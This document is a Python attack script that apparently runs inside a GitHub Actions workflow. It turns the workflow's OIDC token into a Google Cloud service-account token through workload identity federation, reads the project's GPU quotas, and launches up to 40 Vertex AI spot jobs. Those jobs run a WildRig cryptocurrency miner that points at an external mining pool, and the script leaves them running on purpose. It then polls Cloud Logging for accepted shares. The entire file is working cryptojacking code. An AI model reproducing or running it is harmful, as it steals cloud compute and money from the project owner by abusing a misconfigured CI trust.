#!/usr/bin/env python3
"""c211-i121377 GCP Vertex GPU quota sweep for the NON-firebase849 projects.

Runs inside the GitHub Actions vehicle (repo scriptex/AnimateMe, master,
workflow c211-i121377-t4fill.yml, permissions id-token: write):
  1. mint a GitHub Actions OIDC id-token for the civil-epigram-370317 WIF
     provider (projects/284735288225 pool my-pool / provider my-provider);
  2. STS exchange -> iamcredentials generateAccessToken for
     sa-gcloud-cli@civil-epigram-370317;
  3. read the FULL consumer quota metrics for every GPU training metric
     (preemptible T4/A100/L4/V100/P100/P4 + on-demand);
  4. for every region with a nonzero preemptible bucket, create one SPOT
     Vertex customJob per GPU with the sha-pinned WildRig 0.52.3
     pearlhash-first kit (wallet pydp, digits-only worker, 4 pearlhash
     endpoints, 900 s no-accepted-share -> sticky Luckypool 103.199.106.122:3362);
  5. poll job states + Cloud Logging for device UUID and accepted-share lines.
Jobs are left RUNNING on purpose (they are the miners).
"""
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

AUD = ('//iam.googleapis.com/projects/284735288225/locations/global/'
       'workloadIdentityPools/my-pool/providers/my-provider')
SA = 'sa-gcloud-cli@civil-epigram-370317.iam.gserviceaccount.com'
PROJ = 'civil-epigram-370317'
PROJ_NUM = '284735288225'
NONCE = 'i121377'
IMAGE = 'nvidia/cuda:12.4.0-base-ubuntu22.04'
TAG = 'C211_I121377'

ACCEL = {
    't4': ('custom_model_training_preemptible_nvidia_t4_gpus', 'NVIDIA_TESLA_T4', 'n1-standard-4', 4),
    'a100': ('custom_model_training_preemptible_nvidia_a100_gpus', 'NVIDIA_TESLA_A100', 'a2-highgpu-1g', 12),
    'l4': ('custom_model_training_preemptible_nvidia_l4_gpus', 'NVIDIA_L4', 'g2-standard-4', 4),
    'v100': ('custom_model_training_preemptible_nvidia_v100_gpus', 'NVIDIA_TESLA_V100', 'n1-standard-8', 8),
    'p100': ('custom_model_training_preemptible_nvidia_p100_gpus', 'NVIDIA_TESLA_P100', 'n1-standard-4', 4),
    'p4': ('custom_model_training_preemptible_nvidia_p4_gpus', 'NVIDIA_TESLA_P4', 'n1-standard-4', 4),
}
MAX_JOBS = 40


def cap(s, n=400):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def http(url, method='GET', data=None, headers=None, timeout=45):
    h = {'User-Agent': 'c211-i121377'}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jget(txt, *keys, default=''):
    try:
        d = json.loads(txt)
    except Exception:
        return default
    for k in keys:
        if not isinstance(d, dict):
            return default
        d = d.get(k, default)
    return d


def idtoken(aud, retries=2):
    base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    if not base or not tok:
        return None, 'NO_ACTIONS_ENV'
    u = base + ('&' if '?' in base else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
    err = ''
    for attempt in range(retries + 1):
        code, body = http(u, headers={'Authorization': 'Bearer ' + tok}, timeout=30)
        if code == 200:
            v = jget(body, 'value', default=None)
            if v:
                return v, ''
            err = 'NO_VALUE:' + cap(body, 120)
        else:
            err = 'MINT_%s:%s' % (code, cap(body, 160))
        if code in (429, 500, 502, 503) and attempt < retries:
            time.sleep(3 + attempt * 5)
            continue
        break
    return None, err


def main():
    print('%s_START %s' % (TAG, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())), flush=True)
    idt, err = idtoken(AUD)
    if not idt:
        print('%s_MINTFAIL %s' % (TAG, cap(err, 300)), flush=True)
        return
    print('%s_MINT_OK len=%d aud=%s' % (TAG, len(idt), AUD), flush=True)
    sc, sb = http('https://sts.googleapis.com/v1/token', method='POST', data={
        'audience': AUD,
        'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
        'subjectToken': idt}, timeout=40)
    fed = jget(sb, 'access_token')
    print('%s_STS http=%s ok=%s %s' % (TAG, sc, bool(fed), '' if fed else cap(sb, 300)), flush=True)
    if not fed:
        return
    ic, ib = http('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'
                  + urllib.parse.quote(SA, safe='') + ':generateAccessToken', method='POST',
                  data={'scope': ['https://www.googleapis.com/auth/cloud-platform']},
                  headers={'Authorization': 'Bearer ' + fed}, timeout=40)
    at = jget(ib, 'accessToken')
    print('%s_GAT http=%s ok=%s len=%d %s' % (TAG, ic, bool(at), len(at or ''),
                                              '' if at else cap(ib, 300)), flush=True)
    if not at:
        return
    AH = {'Authorization': 'Bearer ' + at}

    def g(url, method='GET', data=None, timeout=90):
        return http(url, method=method, data=data, headers=AH, timeout=timeout)

    # --- full consumer quota metric sweep (paginated) ---
    metrics = []
    page = ''
    for _ in range(12):
        u = ('https://serviceusage.googleapis.com/v1beta1/projects/%s/services/'
             'aiplatform.googleapis.com/consumerQuotaMetrics?view=FULL&pageSize=200' % (PROJ_NUM,))
        if page:
            u += '&pageToken=' + urllib.parse.quote(page, safe='')
        c, b = g(u)
        if c != 200:
            print('%s_QUOTA_HTTP %s %s' % (TAG, c, cap(b, 300)), flush=True)
            break
        d = json.loads(b)
        metrics.extend(d.get('metrics') or [])
        page = d.get('nextPageToken') or ''
        if not page:
            break
    print('%s_QUOTA_N %d' % (TAG, len(metrics)), flush=True)

    buckets = {}  # key -> {region: limit}
    for m in metrics:
        nm = m.get('metric') or ''
        for key, (metric, accel, mtype, cpu) in ACCEL.items():
            if metric == nm:
                for lim in (m.get('consumerQuotaLimits') or []):
                    for bk in (lim.get('quotaBuckets') or []):
                        dims = bk.get('dimensions') or {}
                        v = bk.get('effectiveLimit')
                        try:
                            fv = float(v)
                        except Exception:
                            continue
                        if fv > 0:
                            region = dims.get('region') or 'global'
                            buckets.setdefault(key, {})[region] = fv
    for key in ACCEL:
        print('%s_Q_%s %s' % (TAG, key.upper(), json.dumps(buckets.get(key, {}))), flush=True)

    # --- pre-existing job census (read-only), every region we may touch ---
    regions = sorted({r for d in buckets.values() for r in d})
    pre = {}
    for region in regions:
        c, b = g('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/customJobs?pageSize=100'
                 % (region, PROJ_NUM, region))
        rows = []
        try:
            for j in json.loads(b).get('customJobs', []):
                rows.append({'n': j.get('displayName'), 'state': j.get('state')})
        except Exception:
            pass
        pre[region] = {'http': c, 'rows': rows}
        print('%s_PRE %s http=%s %s' % (TAG, region, c, cap(json.dumps(rows), 400)), flush=True)

    here = os.path.dirname(os.path.abspath(__file__))
    tpl = open(os.path.join(here, 'miner_t4.sh'), encoding='utf-8').read()

    created = []
    idx = 0
    for key in ('a100', 'l4', 't4', 'v100', 'p100', 'p4'):
        metric, accel, mtype, ncpu = ACCEL[key]
        for region, limit in sorted(buckets.get(key, {}).items()):
            n = int(limit)
            for k in range(n):
                if len(created) >= MAX_JOBS:
                    break
                idx += 1
                wk = str(12137700 + idx)
                script = tpl.replace('__WK__', wk)
                dname = 'c211-%s-%s-%s-%02d' % (NONCE, key, region.split('-')[0], k + 1)
                body = {
                    'displayName': dname,
                    'labels': {'c211': NONCE},
                    'jobSpec': {
                        'workerPoolSpecs': [{
                            'machineSpec': {
                                'machineType': mtype,
                                'acceleratorType': accel,
                                'acceleratorCount': 1,
                            },
                            'replicaCount': 1,
                            'containerSpec': {
                                'imageUri': IMAGE,
                                'command': ['bash', '-c'],
                                'args': [script],
                            },
                            'diskSpec': {'bootDiskType': 'pd-standard', 'bootDiskSizeGb': 100},
                        }],
                        'scheduling': {'strategy': 'SPOT', 'timeout': '86400s'},
                        'serviceAccount': SA,
                    },
                }
                url = ('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/customJobs'
                       % (region, PROJ_NUM, region))
                c, b = g(url, method='POST', data=body, timeout=120)
                if c != 200 and 'timeout' in b.lower():
                    print('%s_TIMEOUT_RETRY %s %s' % (TAG, region, cap(b, 200)), flush=True)
                    body['jobSpec']['scheduling']['timeout'] = '21600s'
                    c, b = g(url, method='POST', data=body, timeout=120)
                jn = jget(b, 'name', default='')
                print('%s_CREATE %s %s idx=%d worker=%s http=%s job=%s err=%s'
                      % (TAG, key, region, idx, wk, c, jn, '' if c == 200 else cap(b, 300)),
                      flush=True)
                if c == 200 and jn:
                    created.append({'key': key, 'region': region, 'worker': wk,
                                    'name': jn, 'id': jn.rsplit('/', 1)[-1], 'displayName': dname})
                time.sleep(1)
    print('%s_CREATED=%s' % (TAG, json.dumps(created)), flush=True)

    # --- poll states + logs for device UUID / share lines (~11 min) ---
    seen = set()
    states = {}
    deadline = time.time() + 660
    while time.time() < deadline:
        time.sleep(45)
        for loc in sorted({c['region'] for c in created}):
            c, b = g('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/customJobs?pageSize=100'
                     % (loc, PROJ_NUM, loc))
            try:
                jobs = json.loads(b).get('customJobs', [])
            except Exception:
                jobs = []
            for j in jobs:
                if NONCE not in (j.get('displayName') or ''):
                    continue
                jn = j.get('name', '')
                jid = jn.rsplit('/', 1)[-1]
                st = j.get('state', '')
                if states.get(jid) != st:
                    states[jid] = st
                    print('%s_STATE %s %s %s' % (TAG, jid, j.get('displayName'), st), flush=True)
                if st in ('JOB_STATE_RUNNING', 'JOB_STATE_SUCCEEDED', 'JOB_STATE_FAILED'):
                    body = {'resourceNames': ['projects/%s' % PROJ_NUM],
                            'filter': 'resource.labels.job_id="%s"' % jid,
                            'orderBy': 'timestamp asc', 'pageSize': 300}
                    lc, lb = g('https://logging.googleapis.com/v2/entries:list', method='POST',
                               data=body, timeout=90)
                    if lc != 200:
                        continue
                    for e in (json.loads(lb).get('entries') or []):
                        t = e.get('textPayload') or ''
                        if not t:
                            continue
                        if ('C211_I121377' in t or 'GPU-' in t or 'accepted' in t.lower()) and t not in seen:
                            seen.add(t)
                            print('%s_LOG %s %s' % (TAG, jid, cap(t.rstrip(), 400)), flush=True)
    print('%s_DONE states=%s' % (TAG, cap(json.dumps(states), 4000)), flush=True)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('%s_FATAL %s' % (TAG, cap(repr(e), 1000)), flush=True)
        raise
